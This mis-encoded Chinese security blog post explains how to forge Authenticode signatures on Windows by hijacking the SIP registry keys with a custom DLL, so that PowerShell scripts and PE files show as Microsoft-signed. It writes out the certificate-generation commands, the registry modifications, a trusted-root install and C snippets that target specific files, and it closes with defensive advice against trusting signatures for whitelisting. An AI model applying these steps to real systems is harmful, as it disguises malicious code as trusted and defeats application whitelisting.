I"êC<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>åœ¨ä¸Šç¯‡æ–‡ç« <a href="https://3gstudent.github.io/Authenticode%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0-PE%E6%96%87%E4%BB%B6%E7%9A%84%E7%AD%BE%E5%90%8D%E4%BC%AA%E9%80%A0%E4%B8%8E%E7%AD%BE%E5%90%8D%E9%AA%8C%E8%AF%81%E5%8A%AB%E6%8C%81">ã€ŠAuthenticodeç­¾åä¼ªé€ â€”â€”PEæ–‡ä»¶çš„ç­¾åä¼ªé€ ä¸ç­¾åéªŒè¯åŠ«æŒã€‹</a>ä»‹ç»äº†é’ˆå¯¹å•ä¸€æ–‡ä»¶çš„Authenticodeç­¾åä¼ªé€ ï¼Œéœ€è¦åœ¨æ–‡ä»¶å°¾éƒ¨æ·»åŠ ä¼ªé€ çš„ç­¾åæ•°æ®ï¼Œè¿™æ¬¡å°†ä»‹ç»å¦ä¸€ç§ç­¾åä¼ªé€ æ–¹å¼ï¼šé€šè¿‡ä¿®æ”¹ç³»ç»Ÿçš„ç­¾åè·å–æœºåˆ¶ï¼Œæ¬ºéª—ç³»ç»Ÿå°†æ­£å¸¸æ–‡ä»¶è¯†åˆ«ä¸ºåŒ…å«ç­¾åæ•°æ®ã€‚</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>æœ¬æ–‡ä»‹ç»çš„æŠ€å·§å‚è€ƒè‡ªMatt Graeber@mattifestationå…¬å¼€çš„èµ„æ–™ï¼Œæœ¬æ–‡å°†ç»“åˆè‡ªå·±çš„ç»éªŒï¼Œæ•´ç†ç›¸å…³å†…å®¹ï¼Œæ·»åŠ ä¸ªäººç†è§£ã€‚</p>

<p><strong>å‚è€ƒèµ„æ–™ï¼š</strong></p>

<p>https://specterops.io/assets/resources/SpecterOps_Subverting_Trust_in_Windows.pdf</p>

<p>http://www.exploit-monday.com/2017/08/application-of-authenticode-signatures.html</p>

<p>https://drive.google.com/file/d/0B-K55rLoulAfNms1aW1rbXF1Tmc/view</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>é’ˆå¯¹powershellè„šæœ¬çš„ç­¾åä¼ªé€ æ–¹æ³•</li>
  <li>é’ˆå¯¹PEæ–‡ä»¶çš„ç­¾åä¼ªé€ æ–¹æ³•</li>
  <li>é’ˆå¯¹å…¶ä»–ç±»å‹æ–‡ä»¶çš„ç­¾åä¼ªé€ æ–¹æ³•</li>
  <li>æ·»åŠ ä»£ç å®ç°å¯¹ç‰¹å®šæ–‡ä»¶çš„ç­¾åä¼ªé€ </li>
</ul>

<h2 id="0x02-é’ˆå¯¹powershellè„šæœ¬çš„ç­¾åä¼ªé€ æ–¹æ³•">0x02 é’ˆå¯¹powershellè„šæœ¬çš„ç­¾åä¼ªé€ æ–¹æ³•</h2>
<hr />

<p>å‰ææ˜¯powershellè„šæœ¬éœ€è¦åŒ…å«ä¸€ä¸ªç­¾å(è‡ªå·±ç”Ÿæˆçš„ç­¾åä¼šè¢«è¯†åˆ«ä¸ºæ— æ•ˆ)ï¼Œä¸‹é¢ä»‹ç»å¦‚ä½•å°†è¯¥æ— æ•ˆç­¾åä¼ªé€ æˆæœ‰æ•ˆçš„å¾®è½¯ç­¾å</p>

<p>ç”Ÿæˆæµ‹è¯•è¯ä¹¦ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert -n "CN=Microsoft Windows Test1" -r -eku 1.3.6.1.5.5.7.3.3 -sv certtest.pvk certtest.cer
cert2spc certtest.cer certtest.spc
pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
</code></pre></div></div>

<p>ä¸éœ€è¦æ³¨å†Œè¯¥è¯ä¹¦</p>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä½¿ç”¨makecert.exeè¦åŠ å‚æ•°ï¼š <code class="language-plaintext highlighter-rouge">-eku 1.3.6.1.5.5.7.3.3</code></p>

<p>å¦åˆ™æç¤ºè¯ä¹¦æ— æ³•ç”¨äºä»£ç ç­¾åï¼Œå…·ä½“é”™è¯¯å¦‚ä¸‹ï¼š</p>

<p><code class="language-plaintext highlighter-rouge">Set-AuthenticodeSignature : Cannot sign code. The specified certificate is not
suitable for code signing.</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-1.png" alt="Alt text" /></p>

<p>ç»™powershellè„šæœ¬ç­¾åï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cert = Get-PfxCertificate certtest.pfx
Set-AuthenticodeSignature -Filepath 1.ps1 -Cert $cert
</code></pre></div></div>

<p>éªŒè¯è¯ä¹¦ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\1.ps1
</code></pre></div></div>

<p>æç¤º<code class="language-plaintext highlighter-rouge">UnknownError</code>ï¼Œè¡¨ç¤ºæ–‡ä»¶ç­¾åæ— æ•ˆ</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-2.png" alt="Alt text" /></p>

<p>ä¿®æ”¹æ³¨å†Œè¡¨ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{603BCC1F-4B59-4E08-B724-D2C6297EF351}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
</code></pre></div></div>

<p>å†æ¬¡éªŒè¯ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\1.ps1
</code></pre></div></div>

<p>æ˜¾ç¤º<code class="language-plaintext highlighter-rouge">Valid</code>ï¼Œç­¾åæœ‰æ•ˆ</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/2-3.png" alt="Alt text" /></p>

<p><strong>æ³¨ï¼š</strong></p>

<p>ä¸åŒç³»ç»Ÿä¸‹ç›¸åŒåç§°çš„æ–‡ä»¶ç­¾åä¸åŒ</p>

<p><code class="language-plaintext highlighter-rouge">AFDD80C4EBF2F61D3943F18BB566D6AA6F6E5033</code>ä¸ºMatt Graeberæµ‹è¯•ç³»ç»Ÿä¸­çš„notepad.exeç­¾åhash</p>

<p>ç°åœ¨åœ¨æˆ‘ä»¬è‡ªå·±çš„ç³»ç»Ÿè¿›è¡Œæµ‹è¯•ï¼š<code class="language-plaintext highlighter-rouge">Win10 x64</code></p>

<p>åˆ†åˆ«è·å–notepad.exeçš„ç­¾åä¿¡æ¯ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature c:\windows\system32\notepad.exe
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sigcheck -i C:\Windows\System32\notepad.exe
</code></pre></div></div>

<p>å¯ä»¥å‘ç°sigcheckçš„è¾“å‡ºå†…å®¹ä¸­ï¼Œ<code class="language-plaintext highlighter-rouge">Thumbprint</code>å¯¹åº”æ–‡ä»¶ç­¾åhashï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-1.png" alt="Alt text" /></p>

<p>æ¥ä¸‹æ¥ï¼Œå°†æµ‹è¯•ç³»ç»Ÿæ”¹ä¸º<code class="language-plaintext highlighter-rouge">Win7 x86</code></p>

<p>åœ¨Win7ä¸‹ä½¿ç”¨<code class="language-plaintext highlighter-rouge">Get-AuthenticodeSignature</code>æ— æ³•è·å¾—notepad.exeçš„ç­¾åä¿¡æ¯(catalogç­¾å)</p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-2.png" alt="Alt text" /></p>

<p>ä½†å¯ä»¥é€šè¿‡sigcheckè·å¾—ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-3.png" alt="Alt text" /></p>

<p>hashä¸ºï¼š<code class="language-plaintext highlighter-rouge">018B222E21FBB2952304D04D1D87F736ED46DEA4</code></p>

<p>å®šä½catæ–‡ä»¶è·¯å¾„ï¼š<code class="language-plaintext highlighter-rouge">C:\Windows\system32\CatRoot\{F750E6C3-38EE-11D1-85E5-00C04FC295EE}\ntexe.cat</code></p>

<p>.catæ–‡ä»¶ä¿å­˜æ ¼å¼ä¸ºASN.1æ ‡å‡†ï¼Œç›´æ¥é€šè¿‡è®°äº‹æœ¬æ— æ³•æŸ¥çœ‹ï¼Œéœ€è¦è§£å¯†ï¼Œåœ¨çº¿ç½‘å€å¦‚ä¸‹ï¼š</p>

<p>https://lapo.it/asn1js/</p>

<p>é€‰æ‹©catæ–‡ä»¶åå³å¯è§£å¯†æ˜¾ç¤ºå®Œæ•´æ ¼å¼</p>

<p>æ ¼å¼è§£æå¯å‚è€ƒï¼š</p>

<p>https://support.microsoft.com/en-us/help/287547/object-ids-associated-with-microsoft-cryptography</p>

<p>å°†è¯¥æ–‡ä»¶æ›¿æ¢PoCSubjectInterfacePackageå·¥ç¨‹ä¸­çš„<code class="language-plaintext highlighter-rouge">MS_cert.bin</code>ï¼Œé‡æ–°ç¼–è¯‘</p>

<p>é…ç½®æ³¨å†Œè¡¨</p>

<p>æ‰“å¼€ä¸€ä¸ªæ–°çš„cmdï¼ŒæŸ¥çœ‹powershellè„šæœ¬ç­¾åï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-AuthenticodeSignature .\1.ps1
</code></pre></div></div>

<p>åŒsighcheckè·å–çš„hashå€¼ä¿æŒä¸€è‡´ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/3-4.png" alt="Alt text" /></p>

<p>powershellè„šæœ¬çš„Authenticodeç­¾åä¼ªé€ æˆåŠŸ</p>

<p>å¯¹ä»¥ä¸Šæ“ä½œç›´è§‚çš„ç†è§£ï¼š</p>

<p><strong>è¯¥æ–¹æ³•æ˜¯é€šè¿‡ä¿®æ”¹ç³»ç»Ÿè¯ä¹¦éªŒè¯è¿‡ç¨‹ï¼Œä½¿æ–‡ä»¶å°†æŒ‡å®šçš„catalogç­¾åä½œä¸ºè‡ªå·±çš„Authenticodeç­¾å</strong></p>

<p>å½“ç„¶ï¼Œæ‰€æœ‰å¸¦ç­¾åçš„powershellè„šæœ¬å‡ä¼šç»Ÿä¸€æˆhashä¸º<code class="language-plaintext highlighter-rouge">018B222E21FBB2952304D04D1D87F736ED46DEA4</code>çš„ç­¾åï¼Œè¿™å°±å¸¦æ¥äº†ä¸€ä¸ªé—®é¢˜ï¼š<strong>è¿™æ ·ä¼šå½±å“æ­£å¸¸ç³»ç»Ÿæ–‡ä»¶çš„ç­¾åæ ¡éªŒ</strong></p>

<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œé€šè¿‡è¿™ç§æ–¹å¼ä¼ªé€ çš„ç­¾åä¼šä½œç”¨äºæ‰€æœ‰powershellè„šæœ¬ï¼Œé‚£ä¹ˆï¼Œæˆ‘ä»¬èƒ½å¦é’ˆå¯¹ç‰¹å®špowershellè„šæœ¬ä½œä¼ªé€ å‘¢ï¼Ÿ</p>

<p>ä»¥Matt Graeberå¼€æºçš„å·¥ç¨‹PoCSubjectInterfacePackageä½œä¸ºæ¨¡æ¿è¿›è¡Œä¿®æ”¹ï¼Œä¸‹è½½åœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/mattifestation/PoCSubjectInterfacePackage</p>

<p>é‡ç‚¹å…³æ³¨å‡½æ•°<code class="language-plaintext highlighter-rouge">GetLegitMSSignature</code>ï¼Œåœ¨çº¿åœ°å€ï¼š</p>

<p>https://github.com/mattifestation/PoCSubjectInterfacePackage/blob/master/MySIP/MySIP.c#L138</p>

<p>æŸ¥çœ‹ç»“æ„<code class="language-plaintext highlighter-rouge">SIP_SUBJECTINFO *pSubjectInfo</code>çš„å‚æ•°è¯´æ˜ï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://msdn.microsoft.com/en-us/library/windows/desktop/bb736434(v=vs.85).aspx</p>

<p><code class="language-plaintext highlighter-rouge">pwsFileName</code>å’Œ<code class="language-plaintext highlighter-rouge">pwsDisplayName</code>å‡èƒ½å¤Ÿè¡¨ç¤ºæ–‡ä»¶åç§°ï¼Œæ‰€ä»¥å¯é€šè¿‡<code class="language-plaintext highlighter-rouge">MessageBox</code>è¿›è¡ŒéªŒè¯</p>

<p>å‡½æ•°<code class="language-plaintext highlighter-rouge">GetLegitMSSignature</code>å†…æ·»åŠ å¦‚ä¸‹ä»£ç ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>MessageBox (NULL, pSubjectInfo-&gt;pwsFileName, pSubjectInfo-&gt;pwsDisplayName,0);  
</code></pre></div></div>

<p>è¿›è¡Œæµ‹è¯•ï¼ŒæˆåŠŸè·å¾—ä¼ å…¥æ–‡ä»¶åï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-1.png" alt="Alt text" /></p>

<p>æ¥ä¸‹æ¥çš„æ€è·¯ï¼š</p>

<p>å¯¹ä¼ å…¥çš„æ–‡ä»¶åç§°è¿›è¡Œåˆ¤æ–­ï¼Œæ»¡è¶³æ¡ä»¶çš„æ–‡ä»¶åŠ è½½å¯¹åº”çš„catalogç­¾åï¼Œæœ€ç»ˆå®ç°å¯¹ç‰¹å®šæ–‡ä»¶çš„ç­¾åä¼ªé€ </p>

<p>ç­›é€‰æ–‡ä»¶çš„ä»£ç å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>if(lstrcmpi((LPCTSTR)pSubjectInfo-&gt;pwsFileName,L"C:\\test\\cer\\1.ps1")==0)
{
	MessageBox (NULL,L"Get selected file", (LPCTSTR)pSubjectInfo-&gt;pwsFileName,0) ;   
}
</code></pre></div></div>

<p>å®Œæ•´ä»£ç å¯å‚è€ƒï¼š</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/MySIP.c</p>

<p>å½“å‰æ–‡ä»¶ä¸º<code class="language-plaintext highlighter-rouge">C:\test\cer\1.ps1</code>æ—¶ï¼Œç¬¦åˆæ¡ä»¶ï¼Œè¿›è¡Œç­¾åä¼ªé€ ï¼Œå¦åˆ™æ”¾å¼ƒ</p>

<p>æµ‹è¯•å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-10-11/4-2.png" alt="Alt text" /></p>

<p>æˆåŠŸå®ç°å¯¹ç‰¹å®šæ–‡ä»¶çš„ç­¾åä¼ªé€ ï¼Œè¿™ç§æ–¹å¼çš„ä¼˜ç‚¹æ˜¯ä¸éœ€è¦åœ¨æ–‡ä»¶å°¾éƒ¨æ·»åŠ Authenticodeç­¾åï¼Œä¸æ”¹å˜æ–‡ä»¶hash</p>

<p>å½“ç„¶ï¼Œè¿™ä»…ä»…æ˜¯ä¸€ä¸ªPOCï¼Œè¿˜è¦å¯¹ç³»ç»Ÿæ–‡ä»¶çš„ç­¾åéªŒè¯åšåˆ¤æ–­</p>

<h2 id="0x03-é’ˆå¯¹peæ–‡ä»¶çš„ç­¾åä¼ªé€ æ–¹æ³•">0x03 é’ˆå¯¹PEæ–‡ä»¶çš„ç­¾åä¼ªé€ æ–¹æ³•</h2>
<hr />

<p>å‚è€ƒè¿™ä¸ªåˆ—è¡¨ï¼š</p>

<ul>
  <li>C689AAB8-8E78-11D0-8C47-00C04FC295EE - PE</li>
  <li>DE351A43-8E59-11D0-8C47-00C04FC295EE - catalog	.catæ–‡ä»¶</li>
  <li>9BA61D3F-E73A-11D0-8CD2-00C04FC295EE - CTL .ctlæ–‡ä»¶</li>
  <li>C689AABA-8E78-11D0-8C47-00C04FC295EE - cabinet .cabæ–‡ä»¶</li>
</ul>

<p>å¦‚æœæ›¿æ¢exeæ–‡ä»¶çš„æ ¡éªŒï¼Œå³<code class="language-plaintext highlighter-rouge">CryptSIPDllVerifyIndirectData</code>å’Œ<code class="language-plaintext highlighter-rouge">CryptSIPDllGetSignedDataMsg</code>ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
</code></pre></div></div>

<p>é‡å¯explorer.exeï¼Œæ‰€æœ‰çš„exeæ–‡ä»¶éƒ½åŒ…å«hashä¸ºï¼š<code class="language-plaintext highlighter-rouge">018B222E21FBB2952304D04D1D87F736ED46DEA4</code>çš„ç­¾å</p>

<p>ç‰¹åˆ«çš„åœ°æ–¹ï¼š<strong>ä¼ªé€ çš„ç­¾åæ¥è‡ªäºcatæ–‡ä»¶ï¼Œä½†æ˜¯ä¼šä»¥Authenticodeç­¾åçš„æ ¼å¼æ˜¾ç¤ºï¼Œé€šè¿‡æ–‡ä»¶å±æ€§èƒ½å¤Ÿçœ‹åˆ°ç­¾åä¿¡æ¯(è¿™æ˜¯Authenticodeç­¾åçš„ç‰¹æ€§ï¼Œcatalogç­¾åä¸å…·æœ‰è¯¥ç‰¹æ€§)</strong></p>

<p>åŒæ ·ï¼Œä¿®æ”¹åŸå·¥ç¨‹èƒ½å¤Ÿå®ç°é’ˆå¯¹ç‰¹å®šPEæ–‡ä»¶çš„ç­¾åä¼ªé€ ï¼Œæ–¹æ³•ä¸å†èµ˜è¿°</p>

<h2 id="0x04-é’ˆå¯¹catæ–‡ä»¶çš„ç­¾åä¼ªé€ æ–¹æ³•">0x04 é’ˆå¯¹catæ–‡ä»¶çš„ç­¾åä¼ªé€ æ–¹æ³•</h2>
<hr />

<p>å¦‚æœå¯¹æ‰€æœ‰.catæ–‡ä»¶çš„ç­¾åéªŒè¯è¿‡ç¨‹è¿›è¡Œæ›¿æ¢ï¼Œå†å°†å…¶æ·»åŠ åˆ°å®‰å…¨ç¼–å½•æ•°æ®åº“ä¸­ï¼Œé‚£ä¹ˆï¼ŒåŒ…å«catalogç­¾åçš„PEæ–‡ä»¶æ˜¯å¦ä¹Ÿéšå³è·å¾—ä¼ªé€ ç­¾åå‘¢ï¼Ÿ</p>

<p>ä¸‹é¢å¼€å§‹æµ‹è¯•ï¼š</p>

<p>æ–°å»ºæ–‡æœ¬æ–‡æ¡£cat.txtï¼Œå†…å®¹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[CatalogHeader]
Name=makecat1.cat
[CatalogFiles]
&lt;hash&gt;ExeFile1=mimikatz.exe

</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>txtæ–‡ä»¶å°¾éƒ¨éœ€è¦ä¸€ä¸ªç©ºè¡Œï¼Œå¦åˆ™ï¼Œåœ¨æ¥ä¸‹æ¥çš„æ“ä½œä¼šæŠ¥é”™ï¼Œæç¤ºæ–‡ä»¶æ— æ³•æ‰¾åˆ°</p>

<p>ä½¿ç”¨makecat.exeç”Ÿæˆmakecat1.catï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecat -v cat.txt
</code></pre></div></div>

<p>ä¸ºmakecat1.catæ·»åŠ ä¼ªé€ çš„Authenticodeç­¾åï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool sign /f certtest.pfx /p 123456 makecat1.cat
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>certtest.pfxä¸èƒ½ä½¿ç”¨ä¹‹å‰æ‰‹åŠ¨ç”Ÿæˆçš„è¯ä¹¦ï¼Œä¸èƒ½åŠ å‚æ•°ï¼š <code class="language-plaintext highlighter-rouge">-eku 1.3.6.1.5.5.7.3.3</code>ï¼Œå¦åˆ™exeæ–‡ä»¶çš„catalogç­¾åå°†ä¼šæ ¡éªŒå¤±è´¥</p>

<p>ç”Ÿæˆcerttest.pfxçš„æ“ä½œå¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>makecert -n "CN=Microsoft Windows Test1" -r -sv certtest.pvk certtest.cer
cert2spc certtest.cer certtest.spc
pvk2pfx -pvk certtest.pvk -pi 123456 -spc certtest.spc -pfx certtest.pfx -f
</code></pre></div></div>

<p>æ­¤å¤„è¿˜éœ€è¦å°†è¯ä¹¦å®‰è£…åˆ°â€œå—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„â€å­˜å‚¨åŒº</p>

<p>ç®¡ç†å‘˜æƒé™ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certmgr.exe -add -c certtest.cer -s -r localmachine root
</code></pre></div></div>

<p>å¦åˆ™ï¼Œä¹‹åçš„ç­¾åéªŒè¯ä¼šæŠ¥é”™ï¼Œæç¤ºè¯ä¹¦é“¾ä¸å¯ä¿¡</p>

<p><strong>è¡¥å……ï¼š</strong></p>

<p>ä»â€œå—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„â€å­˜å‚¨åŒºåˆ é™¤è¯ä¹¦çš„æ“ä½œä¸ºï¼š</p>

<p>(ç®¡ç†å‘˜æƒé™)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>certmgr.exe -del -c -n "Windows Test1" -s -r localMachine Root
</code></pre></div></div>

<p>catæ–‡ä»¶å¯¹åº”GUID:<code class="language-plaintext highlighter-rouge">DE351A43-8E59-11D0-8C47-00C04FC295EE</code></p>

<p>æ›¿æ¢æ³¨å†Œè¡¨é”®å€¼ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "AutoApproveHash" /f

REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "Dll" /t REG_SZ /d "C:\test\MySIP.dll" /f
REG ADD "HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{DE351A43-8E59-11D0-8C47-00C04FC295EE}" /v "FuncName" /t REG_SZ /d "GetLegitMSSignature" /f
</code></pre></div></div>

<p>é‡å¯explorer.exeï¼Œæ‰€æœ‰çš„catæ–‡ä»¶ç­¾åå‡ä¸º<code class="language-plaintext highlighter-rouge">Microsoft Windows</code></p>

<p>å°†makecat1.catæ·»åŠ åˆ°ç³»ç»Ÿçš„å®‰å…¨ç¼–å½•æ•°æ®åº“ï¼š</p>

<p>(ç®¡ç†å‘˜æƒé™)</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>signtool catdb -v makecat1.cat
</code></pre></div></div>

<p>æœ€ç»ˆï¼Œå‘ç°æ–‡ä»¶çš„catalogç­¾åä¿æŒä¸å˜ï¼Œæ— æ³•è¿›è¡Œä¼ªé€ </p>

<p>å¾—å‡ºç»“è®ºï¼š <strong>è¿™ç§æ–¹å¼æ— æ³•å¯¹catalogç­¾åè¿›è¡Œä¼ªé€ </strong></p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†Authenticodeç­¾åä¼ªé€ çš„å¦ä¸€ç§åˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡ä¿®æ”¹ç³»ç»Ÿçš„ç­¾åè·å–æœºåˆ¶ï¼Œæ¬ºéª—ç³»ç»Ÿå°†æ­£å¸¸æ–‡ä»¶è¯†åˆ«ä¸ºåŒ…å«ç­¾åæ•°æ®ã€‚</p>

<p>ç»è¿‡è¿™ä¸¤ç¯‡æ–‡ç« çš„æµ‹è¯•ï¼Œå¾—å‡ºæœ€ç»ˆç»“è®ºï¼šåº”è°¨æ…å¯¹å¾…ç³»ç»Ÿçš„Authenticodeç­¾åï¼Œå› ä¸ºé€šè¿‡ä¿®æ”¹æ³¨å†Œè¡¨æˆ–dllåŠ«æŒç­‰æ–¹å¼å‡èƒ½å¤Ÿä¼ªé€ å‡ºå¾®è½¯ç­¾åï¼Œå¯¹æ­¤ï¼Œç™½åå•ç­‰é˜²å¾¡æœºåˆ¶ä¸åº”ç›²ç›®ç›¸ä¿¡Authenticodeç­¾åè¿‡çš„æ–‡ä»¶ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET